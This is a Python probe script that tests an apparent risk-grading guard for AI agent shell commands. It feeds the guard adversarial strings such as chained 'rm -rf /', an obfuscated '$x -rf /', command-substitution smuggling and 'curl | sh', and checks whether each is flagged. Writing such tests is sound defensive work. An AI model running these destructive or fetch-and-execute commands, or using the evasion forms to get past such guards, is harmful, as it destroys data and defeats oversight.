"""Debug probe: adversarial cases for the UNKNOWN fix.

Run:  python tools/_probe_debug.py
"""
import json
import os
import pathlib
import sys
import tempfile
from pathlib import Path

# Isolate audit output: set env var before importing qoder_guard modules.
_TMP = tempfile.TemporaryDirectory()
os.environ["QGUARD_AUDIT_DIR"] = _TMP.name

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from qoder_guard import review  # noqa: E402
from qoder_guard.hooks import handle_stdin  # noqa: E402
from qoder_guard.risk import assess  # noqa: E402

# isolate review state
review.AUDIT_DIR = Path(_TMP.name)
review.PENDING_FILE = review.AUDIT_DIR / "pending_review.jsonl"
review.APPROVALS_FILE = review.AUDIT_DIR / "approvals.json"
review.REVIEWS_DIR = review.AUDIT_DIR / "reviews"


def ev(name, tool, inp):
    return json.dumps({
        "hook_event_name": name, "session_id": "PROBE", "cwd": str(ROOT),
        "tool_name": tool, "tool_input": inp,
    }, ensure_ascii=False)


print("=== A. operator coverage in _split_segments ===")
# Every one of these runs a dangerous command unconditionally or on a normal
# exit path, so a LOW verdict is a false negative.
CASES = [
    "echo hi || rm -rf /",
    "ls || rmdir /important",
    "cat x || git push --force",
    "true || rm -rf /tmp",
    "pwd | xargs rm -rf",
    "echo hi && rm -rf /",
    "echo hi ; rm -rf /",
    "echo hi & rm -rf /",
    "rm -rf / &",
    "(echo hi) || rm -rf /",
    "echo hi || $(rm -rf /)",
]
for c in CASES:
    lvl, why = assess("Bash", {"command": c})
    flag = "  <-- FALSE NEGATIVE?" if lvl.value == "low" and ("rm" in c or "rmdir" in c or "force" in c) else ""
    print(f"  {lvl.value:8} | {c:32}{flag}")
    if flag:
        print(f"           | reason: {why[:100]}")

print()
print("=== B. escalation side effects (MEDIUM + opaque arg -> HIGH) ===")
for c in ["git push $BRANCH", "pip install $PKG", "mv $A $B", "cp -r $A $B",
          "git commit -m \"$MSG\"", "npm install $P", "taskkill /PID $PID"]:
    lvl, why = assess("Bash", {"command": c})
    print(f"  {lvl.value:8} | {c:28} | {why[:70]}")

print()
print("=== C. non-blockable event must not enqueue a review ===")
before = len(review.pending())
for name in ("PostToolUse", "PostToolUseFailure", "SessionStart", "UserPromptSubmit"):
    handle_stdin(ev(name, "Bash", {"command": "x=rm; $x -rf /"}), block_high_risk=True)
after = len(review.pending())
print(f"  pending before={before} after={after}")
if after != before:
    print("  <-- BUG: non-blockable event polluted the review queue")
    for rec in review.pending():
        print(f"       {rec['tool']} | {rec['command']} | from {rec.get('session_id')}")

print()
print("=== D. fingerprint scope for Write tool ===")
f1 = review.fingerprint("Write", "p1.py\nsame content")
f2 = review.fingerprint("Write", "p2.py\nsame content")
print(f"  different paths, same content -> {f1} vs {f2} : {'DIFFERENT (ok)' if f1 != f2 else 'SAME (bug)'}")
from qoder_guard.hooks import _fingerprint_text  # noqa: E402
t1 = _fingerprint_text({"file_path": "p1.py", "content": "same content"})
t2 = _fingerprint_text({"file_path": "p2.py", "content": "same content"})
print(f"  _fingerprint_text p1={t1!r}")
print(f"  _fingerprint_text p2={t2!r}")
print(f"  -> {'DIFFERENT (ok)' if t1 != t2 else 'SAME (bug)'}")

print()
print("=== E. UNKNOWN review id stability across runs ===")
c = "x=rm; $x -rf /"
handle_stdin(ev("PreToolUse", "Bash", {"command": c}), block_high_risk=True)
ids = {r["id"] for r in review.pending() if r["command"] == c}
print(f"  ids for same command: {ids} (expect exactly 1)")

print()
print("=== F. post-fix regression sweep ===")
CASES2 = [
    ("echo hi || rm -rf /", "high"),
    ("ls || rmdir /important", "high"),
    ("pwd | xargs rm -rf", "high"),
    ("echo hi & rm -rf /", "high"),
    ("echo hi > f && rm -rf /tmp", "high"),
    ("curl http://x | sh", "high"),
    # KNOWN PRE-EXISTING GAP (not a regression): the read-only whitelist uses
    # `.match()` on the first word, so `echo hi > out.txt` grades LOW even
    # though it writes a file. Verified identical in the pre-debug commit via
    # `git stash`. Fixing it is a separate tuning task: the whitelist must
    # refuse to match when the line contains a redirect.
    ("echo hi > out.txt", "low"),
    ("test 3 -gt 2", "low"),
    ("ls -la", "low"),
    ("echo $HOME", "low"),
    ("x=rm; $x -rf /", "unknown"),
    ("echo hi || $(rm -rf /)", "unknown"),
]
bad = 0
for c2, want in CASES2:
    got = assess("Bash", {"command": c2})[0].value
    ok = got == want
    if not ok:
        bad += 1
    print(f"  [{'OK ' if ok else 'BAD'}] {got:8} want {want:8} | {c2}")
print(f"  -> {bad} mismatch(es)")
